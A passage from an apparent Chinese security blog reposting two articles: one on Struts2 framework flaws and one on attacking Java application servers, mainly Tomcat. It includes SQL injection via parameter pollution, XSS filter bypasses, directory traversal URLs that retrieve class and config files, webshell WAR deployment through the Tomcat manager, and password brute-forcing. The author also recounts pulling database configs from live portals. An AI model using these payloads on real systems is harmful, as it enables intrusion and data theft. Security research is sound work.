还不做完全，留下一堆问题。</p>
<h3 id="struts2-http-parameter-pollution-">struts2的HTTP Parameter Pollution处理缺陷</h3>
<p>webwork和struts2都有这个问题，当用户给web应用提交: <a href="http://www.inbreak.net/app/test!redirect.action?redir=kxlzx&amp;redir=aaad61" target="_blank">http://www.inbreak.net/app/test!redirect.action?redir=kxlzx&amp;redir=aaad61</a> 时，如果我们在action中定义了 private String redir; public String getRedir() { return redir; } public void setRedir(String redir) { this.redir = redir; } Action就会取到redir的值为“kxlzx, aaad61”注意中间是有空格的。 这种数据是由webwork（struts2）把两个参数合并而成的，但是如果我们request.getParameter(&quot;redir&quot;); 拿到的值，却只是第一个（值为kxlzx）。 我们知道struts2提倡使用拦截器做一些事情，他可以在action的execute方法执行之前和之后做一些操作。 那就有一些开发，想当然的在这里防御一下url跳转、SQL注入、XSS等攻击。我们看看他们会怎么做： @Override public String intercept(ActionInvocation arg0) throws Exception { …… String name = request.getParameter(&quot;name&quot;); if(name!=null&amp;&amp;name.indexOf(&quot;&#39;&quot;)&gt;-1){ System.out.println(&quot;find sql injection&quot;); request.getSession().setAttribute(&quot;msg&quot;, &quot;find sql injection&quot;); return &quot;falseuser&quot;; } String redir = request.getParameter(&quot;redir&quot;); if(redir!=null&amp;&amp;!redir.equals(&quot;<a href="http://www.b.com&quot;)){" target="_blank">http://www.b.com&quot;)){</a> System.out.println(&quot;find url redirect&quot;); request.getSession().setAttribute(&quot;msg&quot;, &quot;find url redirect&quot;); return &quot;falseuser&quot;; } return arg0.invoke(); } 在这段代码中，作者仅仅示例了在拦截器中防御sql注入和url跳转漏洞，sql注入的防御规则是检查 “’”单引号，而url跳转漏洞规则是检查必须跳转到”<a href="http://www.b.com”去。作者知道没有完全防御，" target="_blank">http://www.b.com”去。作者知道没有完全防御，</a> 所以大家先不要在这里追究防御方案，仅仅是一个示例。 而开发人员在业务代码如下： String sql = &quot;select book_name,book_content from books&quot;; if (name != null) { sql += &quot; where book_name like &#39;%&quot; + name + &quot;%&#39;&quot;; } 很明显能注入。 public String redirect() { return &quot;redir&quot;; } 也明显存在url跳转漏洞。 但是由于拦截器在action之前执行，所以如果我们输入了 <a href="http://www.inbreak.net/app/test!findUserByName.action?name=a" target="_blank">http://www.inbreak.net/app/test!findUserByName.action?name=a</a>&#39; 拦截器当然就会返回错误“find sql injection”； <img src="" alt=""> 因为执行到了 String name = request.getParameter(&quot;name&quot;); if(name!=null&amp;&amp;name.indexOf(&quot;&#39;&quot;)&gt;-1){ 发现name的值确实有单引号。 但是如果我们输入了 <a href="http://www.inbreak.net/app/test!findUserByName.action" target="_blank">http://www.inbreak.net/app/test!findUserByName.action</a> ?name=aaaaa&amp;name=a&#39; union select name,pass from user where &#39;&#39;&lt;&gt;&#39; <img src="" alt=""> 就直接绕过了拦截器的判断。因为拦截器获取的request.getParameter(&quot;name&quot;)，是第一个参数的值aaaaa， 抛弃了第二个参数的值，但是action中的name的值，却是 “aaaaa, a&#39; union select name,pass from user where &#39;&#39;&lt;&gt;&#39; ”所以被注入了 大多数拦截器都是这样做的防御，包括一些filter等。 这件事情发生在url跳转漏洞时，却不明显，因为攻击者顶多构造一个： <a href="http://www.inbreak.net/app/test!redirect.action?redir=http://www.b.com&amp;redir=www.inbreak.net" target="_blank">http://www.inbreak.net/app/test!redirect.action?redir=http://www.b.com&amp;redir=www.inbreak.net</a> 抓包看看 <img src="" alt=""> 它跳到了<a href="http://www.b.com" target="_blank">http://www.b.com</a>, www.inbreak.net去了。所以IE直接报错，说打不开这个地址。但是我们还有别的 浏览器，总是喜欢给大家友好信息的浏览器，看看chrome给用户什么提示： <img src="" alt=""> Chrome也认为这是一个错误的链接，所以给出了“正确”的链接地址。这不是刚好被钓鱼网站利用么？ struts2的官方漏洞公告和修补后引发的安全缺陷 从有struts2，到现在为止，官方一共发布了4个漏洞，在 <a href="http://struts.apache.org/2.x/docs/security-bulletins.html" target="_blank">http://struts.apache.org/2.x/docs/security-bulletins.html</a> /<em> S2-001 — Remote code exploit on form validation error /</em> S2-002 — Cross site scripting (XSS) vulnerability on <s:url> and <s:a> tags /<em> S2-003 — XWork ParameterInterceptors bypass allows OGNL statement execution /</em> S2-004 — Directory traversal vulnerability while serving static content 从名字上，可以看出漏洞的内容，作者仅仅对其中两个做了源码级别的漏洞修补评估，发现了很多悲剧的事情。 同学们有兴趣可以去研究剩下两个漏洞。</p>
<h3 id="struts2-s2-002-">struts2的官方漏洞公告和修补后引发的安全缺陷（S2-002）</h3>
<p>先看看“S2-002 — Cross site scripting (XSS) vulnerability on <s:url> and tags”这个漏洞。 顾名思义是对<s:url>和<s:url>的xss漏洞修补，但是前文提到，这里有XSS漏洞，难道是在忽悠大家？我们 看看这帮工程师是怎么修补的，来到这个svn地址： <a href="http://svn.apache.org/viewvc/struts/struts2/trunk/core/src/main/java/org/apache/struts2/views/util/UrlHelper.java?r1=614814&amp;r2=615103&amp;diff_format=h" target="_blank">http://svn.apache.org/viewvc/struts/struts2/trunk/core/src/main/java/org/apache/struts2/views/util/UrlHelper.java?r1=614814&amp;r2=615103&amp;diff_format=h</a> 注意这两行： <img src="" alt=""> 看到这两行代码的时候，作者笑了，因为作者仿佛看到了至少两件悲剧的事情，现在把它们写成故事： 第1件悲剧的事情，某年某月某日，一个脚本小子给官方报告漏洞，说在使用<s:url>标签的时候，代码为： <s:url action="%{/#parameters.url}"></s:url> 之后他输入了 <a href="http://www.inbreak.net/app/test!testpro.action?url=" target="_blank">http://www.inbreak.net/app/test!testpro.action?url=</a><script>alert(&#39;hacked by kxlzx&#39;)</script> 并告诉官方这里是一个XSS漏洞，希望官方修补掉。 官方很重视，一个开发就去修补，添加如下判断： if (result.indexOf(&quot;<script>&quot;) &gt;= 0){ result = result.replaceAll(&quot;<script>&quot;, &quot;script&quot;); 并进行了冒烟测试、功能测试、黑盒测试、白盒测试。认为没有问题了，因为提交攻击者给的恶意url后，输出了 scriptalert(&#39;hacked by kxlzx&#39;)</script> 结果并没有在页面执行xss脚本。后来那脚本小子也测试了一下，发现没问题，这事情就过去了，瞒着人民 大众，悄悄的修补了。 第2件悲剧的事情，又过了某人某月某日，某另一个脚本小子又发了漏洞，还是那段代码，但是url改成了： <a href="http://www.inbreak.net/app/test!testpro.action?url=" target="_blank">http://www.inbreak.net/app/test!testpro.action?url=</a>&lt;<script>&gt;alert(&#39;hacked by kxlzx&#39;)</script> 注意，这里是&lt;<script>&gt;，经过了replaceAll函数后，刚好变成了<script>，重新组成了XSS漏洞。 官方这次不得不重新重视起来，决定把if判断，变成了while，不管你有多少&lt;&lt;&lt;&lt;&lt;&lt;<script>&gt;&gt;&gt;&gt;&gt;&gt;，都给你变成 scriptalert(&#39;hacked by kxlzx&#39;)</script> 并进行了冒烟测试、功能测试、黑盒测试、白盒测试。这次还发了公告出来，说这里没问题了，我们很重视 安全漏洞，已经修补了。 作者看到这里，测试新的bypass官方修补代码的url为： <a href="http://www.inbreak.net/app/test!testpro.action?url=" target="_blank">http://www.inbreak.net/app/test!testpro.action?url=</a><script kxlzx=kxlzx>alert(&#39;hacked by kxlzx&#39;)</script> 于是XSS脚本又被执行了，因为这里是<script kxlzx=kxlzx>，不是<script>，所以不符合判断条件，没有被 replaceAll，再次bypas了漏洞修补。。。</p>
<h3 id="struts2-s2-004-">struts2的官方漏洞公告和修补后引发的安全缺陷（S2-004）</h3>
<p>这个漏洞的修补，比上一个更加令人无奈，这是一个/../获取资源文件的漏洞 S2-004 — Directory traversal vulnerability while serving static content 要了解这个漏洞的成因，大家需要先了解一个知识点。 当struts的FilterDispatcher收到url请求如下两个路径下的文件时： <a href="http://www.inbreak.net/app/struts/" target="_blank">http://www.inbreak.net/app/struts/</a> 或 <a href="http://www.inbreak.net/app/static/" target="_blank">http://www.inbreak.net/app/static/</a> 会去取struts核心包的core.src.main.resources.org.apache.struts2下面的静态资源文件，这些资源文件 其实是一些js脚本和一些css文件。前文提到 <img onmouseover="domTT_activate(this, …'StrutsTTClassic');alert('xss');a('','styleClass’…" /> 代码中的domTT_activate，其实就是 <a href="http://www.inbreak.net/app/struts/domTT.js" target="_blank">http://www.inbreak.net/app/struts/domTT.js</a> 文件中的一个函数。 在struts2.0的时候，只要你敢上某几个版本的struts2，攻击者就可以通过 <a href="http://www.inbreak.net/app/struts/..%252f" target="_blank">http://www.inbreak.net/app/struts/..%252f</a> <a href="http://www.inbreak.net/app/struts/..%252f..%252f..%252fWEB-INF/classess/example/Login.class/" target="_blank">http://www.inbreak.net/app/struts/..%252f..%252f..%252fWEB-INF/classess/example/Login.class/</a> 浏览你的web目录，下载web目录下的文件。 先不说漏洞修补，请读者赶紧想想，你公司的开发人员，是否使用了struts2，并且把 “Struts 2.0.0 - Struts 2.0.11.2 ”之间的几个版本包装了或者根本没有包装，直接上了web应用。 如果有这种情况，就可以直接用以上方式攻击，这几天作者找了几个大型门户网站的漏洞，发现他们都存在 这个漏洞，顺便下载了他们的数据库配置文件，同时报告了漏洞。 <img src="" alt=""> Struts官方可能也受到了攻击，于是修补了代码。 作者同样查看了svn修补记录： <a href="http://svn.apache.org/viewvc/struts/struts2/trunk/core/src/main/java/org/apache/struts2/dispatcher/DefaultStaticContentLoader.java?r1=674498&amp;r2=687425&amp;pathrev=687425&amp;diff_format=h" target="_blank">http://svn.apache.org/viewvc/struts/struts2/trunk/core/src/main/java/org/apache/struts2/dispatcher/DefaultStaticContentLoader.java?r1=674498&amp;r2=687425&amp;pathrev=687425&amp;diff_format=h</a> <img src="" alt=""> 可以看到“ if (!name.endsWith(&quot;.class&quot;)) {”这行代码在修补漏洞时，被删除了。 修补前的代码中，为什么以前要过滤.class文件呢？是因为struts提供了一个功能： 如果开发人员想自己使用这个静态文件映射的功能，可以配置web.xml <filter> <filter-name>struts</filter-name> <filter-class> org.apache.struts2.dispatcher.FilterDispatcher </filter-class> <init-param> <param-name>packages</param-name> <param-value>net.inbreak.action</param-value> </init-param> </filter> 如上配置后，当用户输入 <a href="http://www.inbreak.net/app/struts/domTT.js" target="_blank">http://www.inbreak.net/app/struts/domTT.js</a> 的时候，实际上struts会去找net.inbreak.action这个文件夹下的domTT.js文件发给用户，而不再寻找核心包 的那个文件夹了。这个功能开放后，官方为了防止对应包下的class文件被下载后反编译成源码，所以写了行 代码，过滤.class文件。 就因为这行代码的存在，一时间，刚巧又正是struts2流行的时代。互联网大批的文章介绍struts2核心源码， 在介绍到FilterDispatcher的时候，必然会提到，这里会过滤.class文件，如果开发人员使用这个功能， 可以放心，自己的class文件不会被人下载。 后来出了漏洞，攻击者可以用 <a href="http://www.inbreak.net/app/struts/..%252f..%252f..%252fWEB-INF/classess/example/Login.class/" target="_blank">http://www.inbreak.net/app/struts/..%252f..%252f..%252fWEB-INF/classess/example/Login.class/</a> 绕过官方限制，下载class文件。最终的确修补了这个/../的漏洞。然而悲剧的是，因为class文件实际上 还是可以被下载，所以官方修补的同时，去掉了“if (!name.endsWith(&quot;.class&quot;)) { ”这一行代码，可能是 觉得这一行代码太丢人。 曾经的教程，还在互联网上，告诉大家class文件不会被下载，官方也发表声明修补了/../漏洞。但是看到 教程的开发们，却早已把目录映射了静态文件： <param-name>packages</param-name> <param-value>net.inbreak.action</param-value> 如果这个开发的net.inbreak.action包下有个UserLogin.class文件，在struts2有漏洞的版本，会面临 服务器上所有文件被下载的命运。即使开发升级了struts，因为核心代码中的class文件的判断去掉了， 导致这个文件还是可以被 <a href="http://www.inbreak.net/app/struts/UserLogin.class" target="_blank">http://www.inbreak.net/app/struts/UserLogin.class</a> 官方在没有任何通知的前提下，在教程满天飞告诉大家class文件不会被下载的前提下，为了面子悄悄的 取掉了这个判断。这回好了，无论升级否，都不让人消停，万一开发人员头脑发热，配置如下： <param-name>packages</param-name> <param-value>/</param-value> 就出大事了，可以直接下载资源目录下所有文件。 <a href="http://www.inbreak.net/app/struts/hibernate.cfg.xml" target="_blank">http://www.inbreak.net/app/struts/hibernate.cfg.xml</a> <img src="" alt=""></p>
<h3 id="-">总结</h3>
<p>作者挖了struts2的一些漏洞，也挖了一些web其他框架的漏洞（不在本文范围），总结下挖取这些框架漏洞 的方式。 首先，是上不上框架的问题。一旦开发用了这些框架，web应用会直接面临一些漏洞：</p>
<h3 id="1-">1，开放了某功能，导致采用框架的应用默认漏洞</h3>
<p>因为这个框架在未经允许的情况下，悄悄的打开了某些功能，可能是为了方便开发等作用，结果导致了漏洞 的产生。 举个例： 比如DWR这个AJAX框架一旦使用，在某些版本里，输入 <a href="http://www.inbreak.net/app/dwr/" target="_blank">http://www.inbreak.net/app/dwr/</a> 就能看到一个页面，里面是所有ajax方法的映射，甚至一些service方法没有配置，自动映射了出来。 你可以在这个页面给那些映射出来的方法提交参数，调用方法。比如有个getUserpasswdByid的方法，看名称 就知道，传递用户id，返回密码。 <img src="" alt=""> 再举例就是本文中的struts2的../../漏洞。 如果要挖这种漏洞，绝对是0day级别的漏洞，所以大家有必要怀疑每一个实现步骤，这种漏洞其实大部分就 出现在开发环境和正式环境的差异，以及一些奇奇怪怪的功能点上。</p>
<h3 id="2-">2，扩展了某功能，导致安全问题</h3>
<p>我们的web应用，本来是可以自己写代码实现一些功能的，但是这个框架为了方便开发和管理，把开发人员 要写的代码包装了下，只要简单的几行就能实现原本大批代码才能做到的功能。而这些便利，却带来了很多 安全问题。挖漏洞的同时，应该特别注意哪些地方比原来方便了很多，扩展了很多，这些扩展和方便，是否 考虑到了安全因素。 比如本文介绍的struts的result（urlredirect）相关漏洞。</p>
<h3 id="3-demo-">3，DEMO或教程或用户指南误导</h3>
<p>自从框架出现后，为了让人们最快的了解和使用框架，官方出了很对用户手册，demo等功能。而很多大牛们， 也相应的出了教程或者书籍，但是这些教程，DEMO，书籍上的例子，恰恰产生了很多漏洞。甚至开发本来 不按照教程走，不会有漏洞，却被教程误导了。如果黑客看到这些书籍，请立刻把他列到你的扫描器中， 绝对有不少开发会按照教程上去做。 例如本文提到的那个书籍介绍我们使用ajax的事情。</p>
<h3 id="4-">4，原本有安全方案，但是被某功能代码覆盖</h3>
<p>这其实是一件悲剧的事情，告诉我们要注意在日常开发中和漏洞修补中，是否有不明真相的开发人员， 为了实现某个功能，悄悄的把原本的安全方案断章取义的覆盖掉了。挖漏洞的时候，要特别注意安全方案附件 的代码变动，很可能发现非常弱智的逻辑问题。 例如本文提交的class文件的判断。</p>
<h3 id="5-">5，不完善的安全</h3>
<p>一个安全方案的实施，应该是彻头彻尾的，要注意方案的完整性，不能有些地方方案OK，有些地方不能实施。 在挖漏洞的时候，也不要被安全方案吓住，并不是有了方案，听起来牛X，就绝对不会有漏洞的，最起码应该 经过全面fuzz。 例如本文提到的XSS遗漏点，以及富文本的遗漏。</p>
<h3 id="6-">6，版本升级后，没有醒目安全公告</h3>
<p>我们知道所有的架构师都不愿意有事没事升级框架，特别是不稳定的框架版本，因为这个升级可能带来很多 不可预料的问题，所以可能即使看到了安全公告，也没有去升级。如果不懂安全，更不愿意升级框架了。 所以官方必须做到一个漏洞的修补，一个公告的发布，必须带有相关的代码log。告诉大家具体哪里做了改动。 而挖漏洞的同学更应该盯紧这些地方，百般推敲和测试修改的部分，不要被一次公用的测试结果吓到，模糊的 认为漏洞已经修补了。</p>
<h3 id="7-">7，悲剧的方案</h3>
<p>很多时候，我们会看到官方修补漏洞，或者一些安全方案的实施结果。那是不是真的都能达到修补漏洞的 效果呢？ 例如本文的<s:url>标签的xss漏洞，官方都这个漏洞的修补，真是绞尽脑汁，最终还是悲剧了。</p>
<h3 id="8-">8，优秀的方案，悲剧的执行</h3>
<p>RT，不再说明。</p>
<h3 id="9-web-">9，挑战web服务器配置</h3>
<p>这个问题有必要说一说，struts有事没事做个静态映射做什么？其实是目的就是为了框架和应用分离，很 明显那些js文件应该放在项目中的web目录下，但是为什么要做呢？还不是因为struts包发布的时候，还没有 项目，只有框架。 它为了达到即使上了任何项目，也能有办法访问到它提供的那些js的目的，只好被逼无奈做了这个功能，静态 目录映射。无论任何项目，部署后，只要url后面根目录加上/struts，或者/static就可以访问js。后来做了 这个功能感觉良好还不算，居然把功能提供出来，给推荐给开发人员使用。归根结底是因为struts挑战了 web服务器的配置，非要自己做静态映射。要知道人家web服务器做的映射，是经过多少年黑客入侵打磨出来的， struts有吗？ 这种情况突出在单独映射某目录，单独对某目录做权限，做DIR列表等功能，如果你看到一个框架也做了这种 功能，恭喜你！赶快去挖，十有八九存在漏洞！</p>
<h3 id="10-">10，没有安全方案，也没有提醒</h3>
<p>本文其实没有提到一些web漏洞，比如csrf，比如session fix，比如传输加密等，很明显struts是存在漏洞 的，只是作者觉得这些东西没必要这里说，大家都是明眼人，看到form里没有token，百分百csrf嘛！ 想想官方，官方也明明知道上了自己的框架后，会存在这些漏洞，为什么连个提醒都没有呢？本来开发就 不知道，你又藏着掖着。如果框架负责任，发个公告，说如果你用了我的框架，实际上要小心什么什么攻击。。。 呃。。。我明白官方为什么不敢说了。-_-! 这些框架除了那些“只要你用，必然有漏洞”的安全缺陷外，还有不少问题，会出现在开发人员使用框架的 过程中： 1，两个框架都方便，结合起来有漏洞 有个框架叫做Spring security，是基于url的访问权限控制，做的很好。如果你不是管理员，绝对不能 访问admin目录。但是有很多web框架，访问一个action或者访问一个controller，不止一个url可以访问， 在这里做了兼容性处理，多个url指向同一个应用，导致Spring security这种基于url的访问控制，名存实亡。 2，开发人员“正常”使用框架后，可能产生漏洞 这是最最惨的事情，框架绝对不会认领这种类型的漏洞的，他会认为这是开发的问题。然而本文的 “action方法暴力破解、url redirect扩大化”这两个安全缺陷，实际上也是框架存在的意义（方便开发） 带来的后果。官方会修补么？我想它顶多会说，大家不要这样那样而已，绝对不会做什么安全方案的。 要知道这些漏洞是具有struts或者webwork特色的，只有使用了这些框架才会有的。 3，危险功能点 框架带来了一些功能点，比如Tag lib的一些XSS，只要使用，必定有漏洞。 4，框架给开发挖坑 这根本就是陷阱，还是要说/static、/struts，如果开发不配置，顶多下载个js，影响不大，万一开发使用 了这个功能，映射了某个目录，那就掉进坑里去了。 5，一个框架带来的漏洞被另一个框架最大化 本文提到了变量默认值被覆盖后，又因为hibernate不需要写sql语句，而最终被存储进了数据库中。 回想一个问题，如果让我们自己写sql语句实现，难道在添加普通用户的时候，会真的专门写个变量， 接收用户传进来注册管理员的字段么？ 但是这是hibernate得问题么？当然不是，只是因为有了它，导致漏洞更加严重而已。</p>
<h3 id="-">补充</h3>
<p>本文对struts2的种种安全缺陷，就提到这里。个人觉得这是一个挖漏洞的方向，对framework漏洞的挖掘。 可能大家都专注于代码安全，没有太多的去看框架本身是否安全，以及使用了框架后，是否真的安全。 所以很多人忽略这个问题，我相信这不是一个新的开始，也不是一个结束，只是让大家开始更加重视框架安全。 作者也仅仅在本文提到了struts，webwork这两个框架，事实上框架很多，他们真的安全么？有待考证！ 最后写给那些真正打算把技术应用于实践的同学们，框架漏洞扫描器，是可以做出来的，对于难以解决的猜解 问题，可以对网站蜘蛛一下，然后保存那些开发人员喜欢使用的字段名称，关注各个input的名字，action的 名字，目录名字等，生成猜解一个列表。而判断是否用了struts更加简单： 特征1：XXX.action 可能是struts或webwork 特征2：XXX.do 可能是struts或webwork 特征3：XXX!bbb.action 可能是struts或webwork 特征4：XXX/struts/..%252f 必然是struts2 其他细节处，不再一一给出，有待大家发掘。 相关的漏洞修补方式，作者不在此处献丑，请大家根据漏洞原理自行处理。</p>
<h3 id="-">感谢</h3>
<p>---------------------------------------- 感谢axis （<a href="http://hi.baidu.com/aullik5）对本文提出的建议。" target="_blank">http://hi.baidu.com/aullik5）对本文提出的建议。</a> 感谢幻影webzine <a href="http://webzine.ph4nt0m.org/" target="_blank">http://webzine.ph4nt0m.org/</a> 感谢struts所有开发人员种种有趣的代码。 作者DEMO中有敏感数据，恕不能提供，请大家自行搜索strutsdemo搭建环境测试。 Struts2：<a href="http://struts.apache.org/2.x/" target="_blank">http://struts.apache.org/2.x/</a> Struts2 svn：<a href="http://svn.apache.org/viewvc/struts/struts2/trunk/" target="_blank">http://svn.apache.org/viewvc/struts/struts2/trunk/</a>
Powered by: <a href="http://www.ph4nt0m.org/" target="_blank">Ph4nt0m Security</a> © 2009 <a href="http://www.ph4nt0m.org/" target="_blank">Ph4nt0m Security Team</a>.</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/Java/">Java</a></li></span></span> | <span class="tags">Tagged <a href="/tags/Java/" class="label label-primary">Java</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-29 22:34:04"datetime="2014-03-29 22:34:04"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-Java--Struts2框架安全缺陷/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-Java--Struts2框架安全缺陷" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-Java--攻击JavaWeb应用7-Server篇1/">攻击JavaWeb应用[7]</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-安全-Java--攻击JavaWeb应用7-Server篇1/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h2 id="-javaweb-7-server-1-http-drops-wooyun-org-tips-604-"><a href="http://drops.wooyun.org/tips/604" target="_blank">攻击JavaWeb应用[7]-Server篇[1]</a></h2>
<p>2013/09/22 15:39  | <a href="http://drops.wooyun.org/author/园长" title="由 园长 发布" target="_blank">园长</a>  </p>
<h2 id="java-">java应用服务器</h2>
<p>Java应用服务器主要为应用程序提供运行环境，为组件提供服务。Java 的应用服务器很多，从功能上分为两类：JSP 服务器和 Java EE 服务器。</p>
<h3 id="-server-">常见的Server概述</h3>
<p>常见的Java服务器:Tomcat、Weblogic、JBoss、GlassFish、Jetty、Resin、IBM Websphere、Bejy Tiger、Geronimo、Jonas、Jrun、Orion、TongWeb、BES Application Server、ColdFusion、Apusic Application Server、Sun Application Server 、Oracle9i/AS、Sun Java System Application Server。</p>
<p>Myeclipse比较方便的配置各式各样的Server，一般只要简单的选择下Server的目录就行了。 ￼ <img src="http://static.wooyun.org/20130922/2013092207564531718.png" alt="enter image description here"></p>
<p>部署完成后启动进入各个Server的后台：</p>
<p><img src="http://static.wooyun.org/20130922/2013092207564620473.png" alt="enter image description here"> ￼</p>
<h3 id="-webshell-war-">构建WebShell war文件</h3>
<p>1、打开Myeclipse新建Web项目 2、把jsp放到WebRoot目录下 3、导出项目为war文件</p>
<p><img src="http://static.wooyun.org/20130922/2013092207564836817.png" alt="enter image description here"> ￼</p>
<h2 id="tomcat">Tomcat</h2>
<p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。</p>
<h3 id="tomcat-">Tomcat版本</h3>
<p>Tomcat主流版本:5-6-7，最新版Tomcat8刚发布不久。Tomcat5较之6-7在文件结构上有细微的差异，6-7-8没有大的差异。最新版的Tomcat8主要新增了：Servlet 3.1, JSP 2.3, EL 3.0 and Web Socket 1.0支持。</p>
<p>版本详情说明：<a href="http://tomcat.apache.org/whichversion.html" target="_blank"><a href="http://tomcat.apache.org/whichversion.html">http://tomcat.apache.org/whichversion.html</a></a></p>
<p>结构目录：</p>
<p>Tomcat5：
Bin、common、conf、LICENSE、logs、NOTICE、RELEASE-NOTES、RUNNING.txt、Server、shared、Temp、webapps、work</p>
<p>Tomcat6-8：</p>
<p>Bin、conf、lib、LICENSE、logs、NOTICE、RELEASE-NOTES、RUNNING.txt、temp、webapps、work</p>
<p>关注conf和webapps目录即可。conf目录与非常重要的tomcat配置文件比如登录帐号所在的tomcat-users.xml；域名绑定目录、端口、数据源(部分情况)、SSL所在的server.xml；数据源配置所在的context.xml文件，以及容器初始化调用的web.xml。</p>
<p>源码下载：</p>
<p>Tomcat6：<a href="http://svn.apache.org/repos/asf/tomcat/tc6.0.x/tags/TOMCAT_6_0_18/" target="_blank"><a href="http://svn.apache.org/repos/asf/tomcat/tc6.0.x/tags/TOMCAT_6_0_18/">http://svn.apache.org/repos/asf/tomcat/tc6.0.x/tags/TOMCAT_6_0_18/</a></a></p>
<p>Tomcat7：<a href="http://svn.apache.org/repos/asf/tomcat/tc7.0.x/trunk/" target="_blank"><a href="http://svn.apache.org/repos/asf/tomcat/tc7.0.x/trunk/">http://svn.apache.org/repos/asf/tomcat/tc7.0.x/trunk/</a></a></p>
<h3 id="tomcat-">Tomcat默认配置</h3>
<h3 id="1-tomcat-users-xml">1、tomcat-users.xml</h3>
<p>Tomcat5默认配置了两个角色：tomcat、role1。其中帐号为both、tomcat、role1的默认密码都是tomcat。不过都不具备直接部署应用的权限，默认需要有manager权限才能够直接部署war包，Tomcat5默认需要安装Administration Web Application。Tomcat6默认没有配置任何用户以及角色，没办法用默认帐号登录。</p>
<p>配置详解：<a href="http://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html/#Introduction" target="_blank">http://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html/#Introduction</a></p>
<h3 id="2-context-xml">2、context.xml</h3>
<p>Tomcat的上下文，一般情况下如果用Tomcat的自身的数据源多在这里配置。找到数据源即可用对应的帐号密码去连接数据库。</p>
<Context>     <WatchedResource>WEB-INF/web.xml</WatchedResource>     <Resource name="jdbc/u3" auth="Container" type="javax.sql.DataSource"               maxActive="100" maxIdle="30" maxWait="10000"               username="xxxxx" password="xxxx" driverClassName="com.mysql.jdbc.Driver"               url="jdbc:mysql://192.168.0.xxx:3306/xxx?autoReconnect=true"/> </Context>

<h3 id="3-server-xml">3、server.xml</h3>
<p>Server这个配置文件价值非常高，通常的访问端口、域名绑定和数据源可以在这里找到，如果想知道找到域名对应的目录可以读取这个配置文件。如果有用Https，其配置也在这里面能够找到。</p>
<h3 id="4-web-xml">4、web.xml</h3>
<p>web.xml之前讲MVC的时候有提到过，项目初始化的时候会去调用这个配置文件这个文件一般很少有人动但是不要忽略其重要性，修改web.xml可以做某些YD+BT的事情。</p>
<h3 id="tomcat-webshell">Tomcat获取WebShell</h3>
<h3 id="tomcat-war-webshell">Tomcat后台部署war获取WebShell</h3>
<p>登录tomcat后台：<a href="http://xxx.com/manager/html，一般用" target="_blank">http://xxx.com/manager/html，一般用</a></p>
<p>WAR file to deploy
就行了，</p>
<p>Deploy directory or WAR file located on server
这种很少用。</p>
<p>1&gt;Deploy directory or WAR file located on server</p>
<p>Web应用的URL入口、XML配置文件对应路径、WAR文件或者该Web应用相对于/webapps目录的文件路径，然后单击 按钮，即可发布该Web应用，发布后在Application列表中即可看到该Web应用的信息。这种方式只能发布位于/webapps目录下的Web应用。</p>
<p>2&gt;WAR file to deploy</p>
<p>选择需要发布的WAR文件，然后单击Deploy，即可发布该Web应用，发布后在Application列表中即可看到该Web应用的信息。这种方式可以发布位于任意目录下的Web应用。</p>
<p>其中，第二种方式实际上是把需要发布的WAR文件自动复制到/webapps目录下，所以上述两种方式发布的Web应用都可以通过在浏览器地址栏中输入<a href="http://localhost:8080/Web进行访问。" target="_blank">http://localhost:8080/Web进行访问。</a></p>
<p>￼ <img src="http://static.wooyun.org/20130922/2013092207564999165.png" alt="enter image description here">
Tips: 当访问xxxx.com找不到默认管理地址怎么办? 1:<a href="http://xxxx.com/manager/html" target="_blank">http://xxxx.com/manager/html</a> 查看是否存在 2:ping xxxx.com 获取其IP地址，在访问：<a href="http://111.111.111.111/manager/html" target="_blank">http://111.111.111.111/manager/html</a> 3:遍历server.xml配置读取配置</p>
<h3 id="tomcat-">Tomcat口令爆破</h3>
<p>Tomcat登录比较容易爆破，但是之前说过默认不对其做任何配置的时候爆破是无效的。</p>
<p>Tomcat的认证比较弱，Base64(用户名:密码)编码，请求：” /manager/html/”如果响应码不是401（未经授权：访问由于凭据无效被拒绝。）即登录成功。
conn.setRequestProperty(&quot;Authorization&quot;, &quot;Basic &quot; + new BASE64Encoder().encode((user + &quot;:&quot; + pass).getBytes()));</p>
<h3 id="tomcat-">Tomcat漏洞</h3>
<p>Tomcat5-6-7安全性并不完美，总是被挖出各种稀奇古怪的安全漏洞。在CVE和Tomcat官网也有相应的漏洞信息详情。</p>
<h3 id="-tomcat-">怎样找到Tomcat的历史版本:</h3>
<p><a href="http://archive.apache.org/dist/tomcat/" target="_blank"><a href="http://archive.apache.org/dist/tomcat/">http://archive.apache.org/dist/tomcat/</a></a></p>
<h3 id="tomcat-">Tomcat历史版本漏洞?</h3>
<p>Tomcat官网安全漏洞公布：</p>
<p>Apache Tomcat - Apache Tomcat 5 漏洞： <a href="http://tomcat.apache.org/security-5.html" target="_blank"><a href="http://tomcat.apache.org/security-5.html">http://tomcat.apache.org/security-5.html</a></a></p>
<p>Apache Tomcat - Apache Tomcat 6 漏洞： <a href="http://tomcat.apache.org/security-6.html" target="_blank"><a href="http://tomcat.apache.org/security-6.html">http://tomcat.apache.org/security-6.html</a></a></p>
<p>Apache Tomcat - Apache Tomcat7 漏洞： <a href="http://tomcat.apache.org/security-7.html" target="_blank"><a href="http://tomcat.apache.org/security-7.html">http://tomcat.apache.org/security-7.html</a></a></p>
